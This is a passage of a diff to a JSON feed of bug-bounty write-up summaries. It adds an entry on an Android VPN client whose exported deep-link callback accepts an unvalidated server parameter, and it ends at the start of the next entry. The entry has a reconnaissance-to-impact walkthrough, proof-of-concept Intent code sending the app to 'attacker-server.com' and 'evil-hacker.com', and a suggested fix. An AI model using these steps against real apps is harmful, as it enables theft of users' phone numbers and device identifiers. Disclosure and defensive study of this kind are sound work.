@@ -1,5 +1,47 @@
 [
   {
+    "id": "b890a90a3aa2",
+    "title": "Hijacking Your VPN with one Deep Link",
+    "url": "https://medium.com/@husein.ayoub/hijacking-your-vpn-with-one-deep-link-3ce9ca778306",
+    "source": {
+      "slug": "medium-tag-bug-bounty",
+      "name": "Medium — #bug-bounty"
+    },
+    "authors": [
+      "Hussein Ayoub"
+    ],
+    "program": null,
+    "platform_slug": "self-disclosed",
+    "bounty_raw": null,
+    "published_at": "2026-10-04T21:14:27.000Z",
+    "added_at": "2026-10-04T22:03:48.692Z",
+    "categories": [
+      "access-control",
+      "info-disclosure",
+      "other"
+    ],
+    "severity": "high",
+    "difficulty": "beginner",
+    "summary_en": "An exported Android activity in a VPN client allowed malicious apps to supply a custom backend server via an unvalidated deep link parameter, leading to the theft of sensitive device and user data.",
+    "summary_ar": null,
+    "lesson": {
+      "cause": "The vulnerability is caused by the app exporting activities—components accessible to other apps—that process deep links (URLs that open apps) without validation. Specifically, the 'WebLoginCallbackActivity' and 'WebCallbackHandlerActivity' accept a 'fqdn' parameter (a server address) from any incoming Intent (a message between apps). Because the app fails to verify that the link originated from its own login process or that the hostname belongs to a trusted domain, it allows a local malicious app to redirect the VPN's registration traffic to an attacker-controlled server.",
+      "walkthrough": "RECONNAISSANCE\n1. The researcher obtains the APK (the Android app file) and decompiles it (turns it back into readable code) using a tool called jadx.\n2. They search the 'AndroidManifest.xml' (the app's configuration file) for 'exported' activities, which are screens that any other app on the device can start.\n<activity android:name=\".ui.WebLoginCallbackActivity\" android:exported=\"true\">\nWhy: Exported activities are the primary entry points for local attacks on Android because they allow external apps to send them data.\n\nDISCOVERY\n3. They find that 'WebLoginCallbackActivity' uses 'getIntent().getData()' to read a deep link (a special URL that opens an app screen).\n4. The code extracts a parameter (a piece of data in the URL) called 'fqdn' (the server's web address).\nString fqdn = data.getQueryParameter(\"fqdn\");\nWhy: This parameter tells the app which server it should talk to for its initial setup and registration.\n5. The researcher notices the app uses this 'fqdn' as its base URL (the main address for all its internet requests) without any validation.\nWhy: Without an allowlist (a list of approved addresses), the app will send sensitive data to any address provided in the URL.\n\nEXPLOITATION\n6. The researcher writes a PoC (Proof of Concept, a small test app) that only requires the 'INTERNET' permission.\n<uses-permission android:name=\"android.permission.INTERNET\" />\nWhy: This demonstrates that the attack does not require high-level system privileges or 'root' access.\n7. The PoC app creates a fake deep link URL pointing to the attacker's server.\nUri uri = Uri.parse(\"vpnclient://callback?fqdn=attacker-server.com\");\nWhy: This URL mimics the real login response but replaces the legitimate server with one controlled by the attacker.\n8. The PoC app sends an Intent (a message between apps) directly to the target VPN app's exported activity.\nintent.setComponent(new ComponentName(\"com.vendor.vpnclient\", \"...WebLoginCallbackActivity\"));\nWhy: This forces the VPN app to open and process the malicious URL immediately.\n9. The researcher opens the real VPN app and taps 'Login' to start the 180-second 'window' where the app accepts callbacks.\nWhy: The app only listens for these links for 3 minutes after a login starts, but an automated app can easily trigger the exploit within this time.\n10. While the login browser is open, the researcher runs the PoC app to fire the forged callback.\nWhy: The PoC app sends the fake link while the VPN app is still waiting for the real one, winning the race.\n\nIMPACT\n11. The VPN app accepts the fake server address and sends a 'registration' request to the attacker's server.\nGET /portal/services?action=discover&username=5550199&device_mac=00:11:22...\nWhy: The app thinks it is talking to its own server, so it automatically transmits the user's private information.\n12. The attacker captures the user's MSISDN (phone number), MAC address (hardware ID), and GUID (unique device ID).\nWhy: This data provides a permanent fingerprint of the user and their device, which can be used for tracking or further attacks.",
+      "example": "Imagine a smart home app 'target.example' that uses a deep link to set the 'Update Server' address: 'smarthome://update?server=updates.target.example'. If the app exports the activity handling this link without validation, a malicious app can send: 'smarthome://update?server=evil-hacker.com'. When the smart home app checks for updates, it will connect to the hacker's server instead of the real one. \n\nAttack Intent:\nIntent i = new Intent(Intent.ACTION_VIEW, Uri.parse(\"smarthome://update?server=evil-hacker.com\"));\nstartActivity(i);\n\nWhy it works: The app trusts the 'server' parameter from the deep link without checking if it belongs to 'target.example', allowing an attacker to intercept the app's requests or provide malicious update files.",
+      "takeaway": "When hunting for Android bugs, always audit 'exported' activities in the manifest, especially those handling 'android.intent.action.VIEW'. Look for parameters that define hostnames, URLs, or file paths using 'getIntent().getData()'. A common signal is when these parameters are used to configure network clients like Retrofit or OkHttp. Variants of this bug include 'Intent Redirection,' where an app is forced to launch a private activity, or 'File Provider' leaks. Avoid the mistake of assuming that only the system browser can trigger your deep links; any app on the device can send a direct Intent to an exported activity.",
+      "fix": "To fix this, implement two layers of defense. First, use a 'state' token: when the app starts a login, generate a random, unguessable string and store it in memory. Only accept callbacks that include this exact token. Second, implement a strict allowlist for the 'fqdn' parameter, ensuring it matches a known-good domain exactly.\n\n```java\n// Example Fix\nString receivedState = uri.getQueryParameter(\"state\");\nif (receivedState == null || !receivedState.equals(storedState)) {\n    throw new SecurityException(\"Invalid state token\");\n}\nString fqdn = uri.getQueryParameter(\"fqdn\");\nif (!\"vpn.vendor.com\".equals(fqdn)) {\n    throw new SecurityException(\"Untrusted host\");\n}\n```",
+      "cause_ar": null,
+      "walkthrough_ar": null,
+      "example_ar": null,
+      "takeaway_ar": null,
+      "fix_ar": null
+    },
+    "excerpt": "This is a write-up of a vulnerability I reported to a private bug bounty program. The target is a carrier-grade mobile VPN / secure-access client. During the short window where the app is waiting for an OAuth login to complete, a malicious app sitting on the same device can hand it a different backend, and the VPN client happily starts sending its device-registration API calls there, which was caused by an unvalidated `fqdn` parameter on an exported deep-link callback and led to potentially leaking the user's phone number, MAC address, device GUID, and more _._ ## My workflow: decompile, triag",
+    "ai_generated": true,
+    "engagement": null,
+    "score": 53
+  },
+  {
     "id": "6835bcd31b4d",
     "title": "A 403 Bypass Worth $900: How a Semicolon Exposed API Documentation",
     "url": "https://medium.com/@papjm/a-403-bypass-worth-900-how-a-semicolon-exposed-api-documentation-698eecaf9308",
